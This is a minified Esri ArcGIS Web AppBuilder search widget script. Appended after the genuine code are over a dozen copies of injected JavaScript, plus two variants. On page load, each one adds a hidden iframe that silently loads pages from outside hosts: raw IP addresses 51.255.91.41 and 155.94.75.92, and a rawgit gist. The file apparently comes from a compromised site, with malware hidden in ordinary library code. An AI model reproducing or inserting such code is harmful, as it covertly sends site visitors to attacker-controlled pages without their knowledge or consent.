// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dijit/_WidgetBase dojo/Evented dojo/_base/lang dojo/_base/array esri/dijit/Search esri/tasks/locator esri/layers/FeatureLayer jimu/utils dojo/dom-construct jimu/LayerInfos/LayerInfos ./searchSourceUtils dojo/when dojo/Deferred dojo/promise/all dojo/on esri/InfoTemplate".split(" "),function(m,n,p,c,f,q,r,t,g,u,v,k,w,x,y,l,z){return m([n,p],{config:null,map:null,searchOptions:null,layerInfosObj:null,_urlParams:{},constructor:function(b){c.mixin(this,b)},postCreate:function(){this._urlParams=
{}},startup:function(){this.inherited(arguments);v.getInstance(this.map,this.map.itemInfo).then(c.hitch(this,function(b){this.layerInfosObj=b;this.own(this.layerInfosObj.on("layerInfosFilterChanged",c.hitch(this,this.onLayerInfosFilterChanged)));k.setMap(this.map);k.setLayerInfosObj(this.layerInfosObj);k.setAppConfig(this.appConfig);w(k.getConfigInfo(this.config.searchSourceSettings)).then(c.hitch(this,function(a){this.config.searchSourceSettings||(this.config.searchSourceSettings=a);return y(this._convertConfig(a)).then(function(a){return f.filter(a,
function(a){return a})})})).then(c.hitch(this,function(a){this.domNode&&this._init(a)}))}))},_convertConfig:function(b){return f.map(b.sources,c.hitch(this,function(a){var b=new x;if(a&&a.url&&"locator"===a.type){var d={locator:new r(a.url||""),outFields:["*"],singleLineFieldName:a.singleLineFieldName||"",name:g.stripHTML(a.name||""),placeholder:g.stripHTML(a.placeholder||""),countryCode:a.countryCode||"",maxSuggestions:a.maxSuggestions,maxResults:a.maxResults||6,zoomScale:a.zoomScale||5E4,useMapExtent:!!a.searchInCurrentMapExtent};
a.enableLocalSearch&&(d.localSearchOptions={minScale:a.localSearchMinScale,distance:a.localSearchDistance});b.resolve(d)}else a&&a.url&&"query"===a.type?(d=new t(a.url||null,{outFields:["*"]}),this.own(l(d,"load",c.hitch(this,function(c){var d,e,h;d=c.layer;e=this._getInfoTemplate(d,a,a.displayField);h=null;a.searchFields&&0<a.searchFields.length?h=a.searchFields:(h=[],f.forEach(d.fields,function(a){"esriFieldTypeOID"!==a.type&&a.name!==d.objectIdField&&"esriFieldTypeGeometry"!==a.type&&h.push(a.name)}));
c={featureLayer:d,outFields:["*"],searchFields:h,displayField:a.displayField||"",exactMatch:!!a.exactMatch,name:g.stripHTML(a.name||""),placeholder:g.stripHTML(a.placeholder||""),maxSuggestions:a.maxSuggestions||6,maxResults:a.maxResults||6,zoomScale:a.zoomScale||5E4,infoTemplate:e,useMapExtent:!!a.searchInCurrentMapExtent,_featureLayerId:a.layerId};e||delete c.infoTemplate;c._featureLayerId&&(e=this.layerInfosObj.getLayerInfoById(c._featureLayerId),d.setDefinitionExpression(e.getFilter()));b.resolve(c)}))),
this.own(l(d,"error",function(){b.resolve(null)}))):b.resolve(null);return b}))},_getInfoTemplate:function(b,a,g){var d,e,f;e=(d=this.layerInfosObj.getLayerInfoById(a.layerId))&&d.getInfoTemplate();f=d&&e;if(d&&!f)return null;f||(e=new z,e.setTitle("\x26nbsp;"),e.setContent(c.hitch(this,"_formatContent",a.name,b,g)));return e},_init:function(b){var a;a={map:this.map,addLayersFromMap:!1,autoNavigate:!1,autoComplete:!0,minCharacters:0,searchDelay:100,enableInfoWindow:!0,enableHighlight:this.config.searchSourceSettings.showInfoWindowOnSelect,
showInfoWindowOnSelect:this.config.searchSourceSettings.showInfoWindowOnSelect,allPlaceholder:g.stripHTML(this.config.searchSourceSettings.allPlaceholder)};c.mixin(a,this.searchOptions);this._urlParams=this._getUrlParams();this.search=new q(a,u.create("div",{"class":"searchControl"},this.domNode));this.search.set("sources",b);this.search.set("activeSourceIndex",1===b.length?0:"all");this.own(this.search.on("load",c.hitch(this,this._load)));this.own(this.search.on("select-result",c.hitch(this,this._selectResult)));
this.own(this.search.on("clear-search",c.hitch(this,this._clear)));this.own(this.search.on("search-results",c.hitch(this,this._results)));this.own(this.search.on("suggest-results",c.hitch(this,this._results)));this.search.startup()},_getUrlParams:function(){var b=g.urlToObject(document.location.href);b.query=b.query||{};return b.query},setSearchText:function(b){this.search.set("value",b)},clearSearchText:function(){this.search&&this.search.clear()},_setSearchString:function(){this._urlParams.find&&
(this.search.set("value",this._urlParams.find),setTimeout(c.hitch(this,function(){this.search.search()}),1E3))},onLayerInfosFilterChanged:function(b){f.some(b,c.hitch(this,function(a){this.search&&this.search.sources&&0<this.search.sources.length&&f.forEach(this.search.sources,function(b){b._featureLayerId===a.id&&b.featureLayer.setDefinitionExpression(a.getFilter())})}))},_load:function(b){this.emit("search-loaded",b);this._setSearchString()},_results:function(b){this.emit("search-results",b)},_clear:function(b){this.emit("clear-search",
b)},_selectResult:function(b){this.search.blur();this.emit("select-result",b)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});